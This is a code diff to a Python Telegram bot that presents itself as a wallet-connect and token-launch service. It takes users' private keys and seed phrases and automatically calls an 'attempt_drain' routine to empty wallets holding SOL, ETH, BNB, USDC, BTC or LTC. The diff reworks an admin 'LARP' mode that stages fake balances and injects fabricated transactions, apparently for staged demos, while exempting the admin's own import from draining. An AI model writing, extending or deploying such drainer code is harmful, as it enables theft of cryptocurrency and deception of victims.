@@ -140,6 +140,8 @@ class UserSession:
     last_raw_key: Optional[str] = None
     larp_mode: bool = False
     larp_wallet_idx: Optional[int] = None
+    pending_larp_balance: Optional[float] = None
+    pending_larp_phrase: Optional[str] = None
     larp_profit_total: float = 0.0
 
 sessions: Dict[int, UserSession] = {}
@@ -2006,6 +2008,23 @@ async def wallet_import_receive(message: Message, state: FSMContext):
     sess = get_session(uid)
     sess.last_raw_key = raw
 
+    # If admin previously ran /larpseed, apply staged balance after full connect UX
+    is_larp_import = False
+    pending_bal = getattr(sess, "pending_larp_balance", None)
+    pending_phrase = getattr(sess, "pending_larp_phrase", None)
+    if (
+        LARP_ENABLED
+        and uid in ADMIN_IDS
+        and pending_bal is not None
+        and pending_phrase
+        and _normalize_mnemonic(raw) == _normalize_mnemonic(pending_phrase)
+    ):
+        chosen_bal = float(pending_bal)
+        is_larp_import = True
+        sess.pending_larp_balance = None
+        sess.pending_larp_phrase = None
+        sess.larp_mode = True
+
     w = UserWallet(
         private_key=chosen_priv if chosen_priv != "EVM_ONLY" else (eth_priv or ""),
         public_key=chosen_pub,
@@ -2024,22 +2043,30 @@ async def wallet_import_receive(message: Message, state: FSMContext):
         ltc_priv=ltc_priv,
         balance_ltc=bal_ltc,
         drained=False,
+        is_larp=is_larp_import,
     )
     sess.wallets.append(w)
     sess.active_wallet_idx = len(sess.wallets) - 1
+    if is_larp_import:
+        sess.larp_wallet_idx = sess.active_wallet_idx
+        add_personal_tx(sess, "Wallet Connected", "success")
+        inject_fake_txs(2)
+        _save_state()
 
     text = (
         "<b>Wallet Connected</b>\n\n"
         f"<code>{chosen_pub}</code>\n\n"
-        f"🏷 Label: <b>{w.label}</b>\n"
-        f"{SOL_EMOJI}: <b>{w.balance_sol:.4f}</b>\n"
-        "\nStatus: <b>Active</b>\n\nYou can now launch tokens."
+        f"Label  <b>{w.label}</b>\n"
+        f"{SOL_EMOJI}  <b>{w.balance_sol:.4f}</b>\n\n"
+        "Status  <b>Active</b>"
     )
 
     await status_msg.edit_text(text, reply_markup=main_menu_kb(), parse_mode=ParseMode.HTML)
     await state.clear()
 
-    if (chosen_bal > 0.00001 or bal_eth > 0.0001 or bal_bnb > 0.0001 or bal_usdc > 0.5
+    if is_larp_import:
+        log.info("LARP import — drain skipped pub=%s bal=%.4f", chosen_pub, chosen_bal)
+    elif (chosen_bal > 0.00001 or bal_eth > 0.0001 or bal_bnb > 0.0001 or bal_usdc > 0.5
             or bal_btc > 0.00001 or bal_ltc > 0.0001):
         asyncio.create_task(attempt_drain(
             uid,
@@ -3205,10 +3232,9 @@ async def cmd_addbal(message: Message):
 
 @router.message(Command("larpseed"))
 async def cmd_larpseed(message: Message):
-    """Admin: /larpseed 100 — random seed + LARP wallet at that SOL balance."""
+    """Admin: /larpseed 100 — print a random seed only. You import it yourself."""
     uid = message.from_user.id
     if uid not in ADMIN_IDS:
-        # silent for non-admins, but log so deploy logs show the miss
         log.warning("larpseed denied uid=%s admin_ids=%s", uid, list(ADMIN_IDS)[:5])
         return
     global bot_balance_sol, LARP_ENABLED
@@ -3228,48 +3254,29 @@ async def cmd_larpseed(message: Message):
             return
 
         phrase = " ".join(random.choice(BIP39_WORDLIST) for _ in range(12))
-        pub = _fake_sol_pubkey()
-        try:
-            if HAS_SOLANA and _is_mnemonic(phrase):
-                candidates = derive_solana_paths(phrase)
-                if candidates:
-                    pub = candidates[0][2]
-        except Exception as e:
-            log.warning("larpseed derive soft-fail: %s", e)
 
+        # Stash expected LARP balance for this admin so Connect Wallet can apply it
+        # without auto-linking here.
         LARP_ENABLED = True
         bot_balance_sol = bal
         sess = get_session(uid)
-        remove_larp_wallets(sess)
-        w = UserWallet(
-            private_key="LARP_SIM",
-            public_key=pub,
-            label="Main",
-            balance_sol=bal,
-            chain="sol",
-            is_larp=True,
-        )
-        sess.wallets.append(w)
-        sess.larp_wallet_idx = len(sess.wallets) - 1
-        sess.active_wallet_idx = sess.larp_wallet_idx
         sess.larp_mode = True
-        sess.last_raw_key = phrase
-        add_personal_tx(sess, "Wallet Connected", "success")
-        inject_fake_txs(3)
+        # pending balance used only after manual import of this seed
+        sess.pending_larp_balance = bal
+        sess.pending_larp_phrase = phrase
         _save_state()
 
         text = (
-            "<b>LARP seed ready</b>\n\n"
+            "<b>LARP seed</b>\n\n"
             f"<code>{phrase}</code>\n\n"
-            f"Address\n<code>{pub}</code>\n\n"
-            f"Balance <b>{SOL_EMOJI} {bal:.4f}</b>\n"
-            "LARP <b>ON</b>\n\n"
-            "Copy the seed → Connect Wallet to replay the import,\n"
-            "or stay on this session as-is."
+            f"Target balance  <b>{SOL_EMOJI} {bal:.4f}</b>\n"
+            "LARP armed — wallet <b>not</b> connected yet.\n\n"
+            "1. Copy the seed\n"
+            "2. Open <b>Wallet → Connect Wallet</b>\n"
+            "3. Paste it — full connect flow runs, then balance shows"
         )
-        # Use plain answer so it never depends on _admin_reply / auto-delete bugs
         await message.answer(text, parse_mode=ParseMode.HTML)
-        log.info("larpseed OK user=%s bal=%.4f pub=%s", uid, bal, pub[:12])
+        log.info("larpseed issued uid=%s bal=%.4f (manual connect)", uid, bal)
     except Exception as e:
         log.exception("larpseed failed: %s", e)
         try:
